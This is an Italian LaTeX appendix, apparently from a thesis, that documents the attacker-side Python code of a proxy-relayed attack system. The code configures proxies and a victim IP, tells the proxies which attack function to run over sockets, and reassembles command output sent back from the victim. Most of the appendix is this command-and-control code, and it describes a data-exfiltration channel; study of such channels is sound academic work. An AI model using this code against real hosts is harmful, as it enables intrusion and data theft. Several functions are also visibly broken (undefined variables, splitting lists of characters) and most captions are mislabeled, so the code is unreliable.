\section{Appendice Attaccante} \label{appendice:attaccante}
In questa appendice si approfondiranno ulteriori metodi utilizzati dall'attaccante. 
In particolare: 
\begin{itemize}
    \item come i dati ricevuti dalla vittima vengono riordinati ed uniti.
\end{itemize} 


\subsection{Rilevamento degli argomenti passati} 
Per passare degli argomenti tramite linea di comando; si usa la libreria \textbf{argparse} per creare un parser 
e si definiscono gli argomenti voluti (in questo caso \textit{--file\_path}). 
Dopodichè si controlla che si sinao inseriti gli argomenti giusti [Code:\ref{script:appendice:attaccante:argomenti}]. 
\begin{itemize}
    \item Nel caso si siano inseriti argomenti sconosciuti il programma termina e vengono stampati quali sono quelli accettati. 
    \item altrimenit se sono corretti, gli argomenti vengono restituiti a chi ha chiamato il metodo. 
\end{itemize}
\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={check_value_in_parser, get_args_from_parser, print_parser_supported_arguments, check_for_unknown_args}, emphstyle=\color{red} 
    ,emph={[2]args, parser, unknown},emphstyle={[2]\color{blue}} 
    ,emph={[3]index}, emphstyle={[3]\color{olive}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
] 
def get_args_from_parser(): 
    parser = argparse.ArgumentParser()
    parser.add_argument("--file_path",type=str, help="File di configurazione")  
    try:
        args, unknown =mymethods.check_for_unknown_args(parser)  
        if len(unknown) > 0: 
            raise Exception(f"Argomenti sconosciuti: {unknown}") 
        if check_value_in_parser(args):  
            return args
    except Exception as e:
        mymethods.print_parser_supported_arguments(parser)
        raise Exception(f"get_args_from_parser: {e}") 

def check_value_in_parser(args):
    if not isinstance(args,argparse.Namespace): 
        raise Exception(f"Argomento parser non istanza di argparse.Namespace")  
    if not isinstance(args.file_path,str):
        raise Exception(f"--file_path non specificato: {args.file_path}") 
    return True 
\end{lstlisting}
\captionof{lstlisting}{Rilevamento degli argomenti passati} 
\label{script:appendice:attaccante:argomenti}

\subsection{Caricamento del file di configurazione} 
Il file di configurazione è un file JSON. 
Quindi tramite la librearia \textbf{jsno} procederemo a caricarlo [Code: \ref{script:appendice:attaccante:fileconf} line 9]. 
\vspace{2ex} \newline
Dopodichè la variabile indicante il file json verra passata ai metodi utilizzati per ricavare ulteriori variabili necessarie:
\begin{itemize}
    \item La \textbf{lista dei proxy}: 
    per ogni proxy definito nel campo \textit{proxy\_list}; si controlla se il suo valore è un indirizzo IP valido. 
    Se non lo è si passa all'indirizzo successivo. Altrimenti si aggiunte alla lista dei proxy connessi. 
    Finito di controllarli tutti, si ritorna la lista. 
    \item L'\textbf{ip dellìhost}: 
    per trovarlo si crea un socket e da esso si ricava l'indirizzo IP. 
    Nel caso ci siano errori, si chiederà di immetterlo manualmente
    \item L'\textbf{indirizzo della vittima}: 
    viene ricavato dal file di ocnfigurazione e se risulta corretto; viene ritornato al metodo chiamante.
    \item L'\textbf{attacco utilizzato}: 
    viene ricavato tramite la libreria \textit{attacksingleton.py}. 
    Al suo interno, nella classe \textit{AttackType}, è presente un metodo che data in input una stringa ritorna l'attacco associato. 
    tuttavia se la stringa risulta errata, il metodo non ritornerà niente e in questo caso bisongerà scegliere manualmente il metodo di attacco. 
\end{itemize}
\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={load_config_file, load}, emphstyle=\color{red} 
    ,emph={[2]default_file_path, path_file},emphstyle={[2]\color{blue}} 
    ,emph={[3]set_proxy_list, get}, emphstyle={[3]\color{red}} 
    ,emph={[4]proxy_list, proxy_ip}, emphstyle={[4]\color{blue}} 
    ,emph={[5]dict_proxy, value, config_file}, emphstyle={[5]\color{olive}} 
    ,emph={[6]setIP_host, setIP_vittima, attack_type, get_attack_function, choose_attack_function}, emphstyle={[6]\color{red}} 
    ,emph={[7]ip_host, errore, ip_vittima, attack_func}, emphstyle={[7]\color{blue}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
] 
def load_config_file(default_file_path, path_file): 
    if not os.path.exists(path_file) or not str(path_file).endswith(".json"):
        if os.path.exists(default_file_path):
            print(f"Si usa file di configurazione di default")
            path_file=default_file_path
        else: 
            raise FileNotFoundError(f"File di configurazione non esiste")
    with open(path_file, 'r') as file: 
        print(f"File di configurazione {path_file} caricato correttamente") 
        return json.load(file)

def set_proxy_list(config_file):
    proxy_list:list[ipaddress.IPv4Address]=[]
    for dict_proxy in config_file.get("proxy_list", []):
        if not isinstance(dict_proxy, dict):
            print(f"proxy is not dict: {dict_proxy}")
            continue 
        for value in dict_proxy.values(): 
            try:
                proxy_ip=ipaddress.ip_address(value)
                proxy_list.append(proxy_ip)  
            except Exception as e:
                print(f"\tset_proxy_list: {e}") 
    print(f"Lista proxy sanificata")
    return proxy_list

def setIP_host():
    while True:
        try:
            ip_host, errore=mymethods.find_local_IP() 
            if ip_host is not None and ipaddress.ip_address(ip_host): 
                ip_host=ipaddress.ip_address(ip_host) 
                print("***IP host: ",type(ip_host),ip_host)
            else:
                print(f"Errore nel trovare l'IP: {errore}")
                msg="Inserire indirizzo IP dell'host:\n\t#" 
                ip_host=ipaddress.ip_address(input(msg)) 
                print("***IP host: ",type(ip_host),ip_host)
            return ip_host
        except Exception as e:
                print(f"setIP_host: {e}") 

def setIP_vittima(config_file):
    ip_vittima = ipaddress.ip_address(config_file.get("ip_vittima", None))  
    if ip_vittima is None or not (isinstance(ip_vittima, ipaddress.IPv4Address) or isinstance(ip_vittima, ipaddress.IPv6Address)):
        raise ValueError(f"L'indirizzo IP della vittima non valido: {ip_vittima}") 
    return ip_vittima

def attack_type(config_file): 
    attack_func=config_file.get("attack_function")
    attack_func = attacksingleton.get_attack_function(attack_func)
    if not isinstance(attack_func, dict) or len(attack_func.items())!=1:
        print(f"Funzione di attacco non definita ",
            f"non un dizionario" if not isinstance(attack_func, dict) 
            else f"funzioni ricavate" if len(attack_func.items())!=1
            else None
        )
        attack_func=attacksingleton.choose_attack_function() 
    return attack_func

\end{lstlisting}
\captionof{lstlisting}{Rilevamento degli argomenti passati} 
\label{script:appendice:attaccante:fileconf}

\subsection{Aspettando la conferma dai proxy} 
In input si passa l'indirizzo IP del proxy. 
Dopodichè si ricava, dal dizionario \textit{dict\_proxy\_socket}, il socket indicante la connessione con lo stesso. 
Si aspettano poi dei dati dal proxy e li si confronta a il testo di conferma (ovvero il testoaspettatoche indica la conferma della connessione). 
Nel caso non combacino la connessione viene chiusa, il proxy tolto dalla lista di quelli connessi e il metodo ritorna. 
Altrimenti il metodo continua finchè non terrmina.
\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    % 
    ,emph={wait_proxy_update}, emphstyle=\color{red} 
    ,emph={[2]proxy, proxy_socket, data_received},emphstyle={[2]\color{blue}} 
    ,emph={[3]confirm_text, ip_vittima, proxy_list, dict_proxy_socket}, emphstyle={[3]\color{olive}}  
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
] 
def wait_proxy_update(proxy:ipaddress.IPv4Address):  
    try: 
        if not isinstance(proxy, ipaddress.IPv4Address):
            raise Exception(f"Indirizzo IP vittima non corretto") 
    except Exception as e:
        print(f"attacker_wait_proxy_update: {e}")
        return None
    try:
        proxy_socket=dict_proxy_socket.get(proxy.compressed)
        confirm_text=com.CONFIRM_VICTIM+ip_vittima.compressed+proxy.compressed  
        data_received=proxy_socket.recv(1024).decode()
        if confirm_text not in data_received: 
            raise Exception(f"Dati ricevuti invalidi {data_received}")
        result=data_received.replace(confirm_text,"")
        print(f"{proxy} connesso alla vittima? {type(result)} {result}")
        if result!="True":
            print(f"Proxy {proxy} non connesso alla vittima")
            dict_proxy_socket.pop(proxy.compressed)
            proxy_socket.close()  
            proxy_list.pop(proxy_list.index(proxy)) 
            return False 
        print(f"Proxy {proxy} connesso alla vittima")
        return True
    except Exception as e:
        print(f"wait_proxy_update: {e}")
        return False 
\end{lstlisting}
\captionof{lstlisting}{Rilevamento degli argomenti passati} 
\label{script:appendice:attaccante:proxyUpdate}

\subsection{Ricavare i proxy connessi}
Quando si ricavano la prima volta i proxy connessi; 
si crea anche un dizionario contenente il socket della connessione e una lista di thread (che eseguiranno \textit{wait\_proxy\_update}). 
Quindi in input si prende la lista dei proxy, l'IP della vittima, la callback da assegnare ai thread e la tipologia di attacco fra proxy e vittima. 
\vspace{1ex} \newline
Dopodichè per ogni proxy presente nella lista; 
si crea il socket e ci si connette ad esso. 
Nel caso avvenissero problemi in questa fasela connessione viene chiusa e il proxy rimosso dalal lista dei proxy connessi. 
\vspace{1ex} \newline 
Successivamente l'attaccante invia un messaggio di conferma della connessione e aspetta la risposta del proxy. 
\begin{itemize}
    \item Se la risposta non coincide con quella di conferma; 
    il canale di comunicazione viene chiuso e il prpxy rimosso dalla lista.
\end{itemize}
Altrimenti si crea un thread che verrà aggiunto al dizionario. 
Alla fine ad ogni proxy verra associato il proprio thread. 
\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    % 
    ,emph={get_connected_proxy}, emphstyle=\color{red} 
    ,emph={[2]callback_func, dict_proxy_socket, thread_list},emphstyle={[2]\color{blue}} 
    ,emph={[3]proxy_list, ip_vittima, attack_func}, emphstyle={[3]\color{olive}}  
    ,emph={[4]proxy, socket_proxy, data},emphstyle={[4]\color{blue}}
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
] 
def get_connected_proxy(proxy_list, ip_vittima, callback_func, attack_func):
    dict_proxy_socket:dict[str,socket.socket]={} 
    thread_list:dict[str,threading.Thread]={} 
    for proxy in proxy_list.copy(): 
        try: 
            socket_proxy=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket_proxy.connect((proxy.compressed, 4567)) 
        except Exception as e:
            print(f"Socket {proxy} get_connected_proxy: {e}") 
            socket_proxy.close() 
            proxy_list.pop(proxy_list.index(proxy))
            continue 
        str_victim=com.CONFIRM_ATTACKER+ip_vittima.compressed
        str_attack=com.ATTACK_FUNCTION+next(iter(attack_func.items()))[0]
        data=(str_victim+"||"+str_attack) 
        socket_proxy.sendall(data.encode())

        data=socket_proxy.recv(1024).decode()
        print(f"Socket {proxy} Received: {data}") 
        str_confirm=com.CONFIRM_PROXY+ip_vittima.compressed+proxy.compressed
        if not data or data!=str_confirm:
            print(f"Close connection for {proxy}")  
            socket_proxy.sendall(com.END_COMMUNICATION.encode())
            socket_proxy.close()
            proxy_list.pop(proxy_list.index(proxy)) 
            continue 
        dict_proxy_socket.update({proxy.compressed:socket_proxy})
        thread=threading.Thread(
            target= callback_func 
            ,args=[proxy]
        ) 
        thread_list.update({proxy.compressed:thread})
        thread.start() 
    return thread_list, dict_proxy_socket
\end{lstlisting}
\captionof{lstlisting}{Rilevamento degli argomenti passati} 
\label{script:appendice:attaccante:connectedProxy}

\subsection{Separazione dei dati ricevuti} 
Ciò che invia la vittima ai proxy è una singola stringa strutturata in questo modo: 
\begin{itemize}
    \item Le sottostringhe vengono separate da \textbf{$\parallel$}
    \item Dopodichè al loro interno l'oridne di sequenza e il dato restituito dal coamndo sono separati da \textbf{\&\&}
\end{itemize}
\begin{esempio}{\quad\newline}  
    0 \&\& total $\parallel$ 1 \&\& victim.py $\parallel$ $\dots$ $\parallel$ N \&\& test.py 
\end{esempio} %\noindent
Per separare le stringhe in base al loro ordine [Code:\ref{script:appendice:attaccante:separaDati}]: 
prima si uniscono i dati ricevuti da tutti i proxy in una singola lista (\textit{unindent\_data}). 
Per farlo si iterano tutti i valori presenti nel dizionario \textit{received\_data} e poi si dividono in base alla stringa $\parallel$. 
In questo modo alla lista verranno aggiunte stringhe del tipo: \textbf{seq \&\& data}. 
\vspace{2ex} \newline
Dopodichè si itera su questa lista per separare il valore della sequenza dai dati. 
Questi dati verranno inseriti nel dizionario \textit{dati\_separati} in cui la chiave è il numero di sequenza menre il valore è il dato stesso. 
\vspace{2ex} \newline
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={separa_dati_byID}, emphstyle=\color{red} 
    ,emph={[2]dati_separati,unindent_data, received_data},emphstyle={[2]\color{blue}} 
    ,emph={[3]list_data}, emphstyle={[3]\color{olive}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
] 
def separa_dati_byID(received_data:dict[str,list]): 
    unindent_data=[] 
    for list_data in received_data.values(): 
        if isinstance(list_data, bytes):
            list_data=list_data.decode()
        else: print(type(data))
        for data in list_data.split("||"): 
            unindent_data.append([x for x in data])    
    dati_separati:dict[str,list]={}
    for list_data in unindent_data: 
        if isinstance(list_data, bytes):
            list_data=list_data.decode()
        else: print(type(data))
        list_data=list_data.split("&&")
        if len(list_data)!=2:
            print(f"Errore. Length is {len(list_data)}\t{list_data}")
            continue
        if dati_separati.get(list_data[0]) is None:
            dati_separati.update({list_data[0]:[]}) 
        dati_separati.get(list_data[0]).append(list_data[1])  
    return dati_separati
\end{lstlisting}
\captionof{lstlisting}{Separazione dei dati} 
\label{script:appendice:attaccante:separaDati}
\vspace{2ex} 
Per unire i dati [Code:\ref{script:appendice:attaccante:unisciDati}] si prende un dizionario e si itera sullo stesso. 
Essendo le chiavi dei numeri; si itera usando l'indice che và da 0 sino alla lunghezza del dizionario. 
Dopodichè si aggiunge il dato ricavato alla lista che conterrà l'unione delle stringhe. 
\vspace{2ex} \newline
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={unisciDati}, emphstyle=\color{red} 
    ,emph={[2]dati_separati, stringa, data},emphstyle={[2]\color{blue}} 
    ,emph={[3]index}, emphstyle={[3]\color{olive}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
] 
def unisciDati(dati_separati:dict[str:list]):
    stringa=[] 
    for index in range(len(dati_separati)): 
        for data in dati_separati.get(str(index)):
            if data[2]==com.LAST_PACKET:
                continue
            stringa.append(data[2])
    return stringa
\end{lstlisting}
\captionof{lstlisting}{Unione dei dati} 
\label{script:appendice:attaccante:unisciDati}

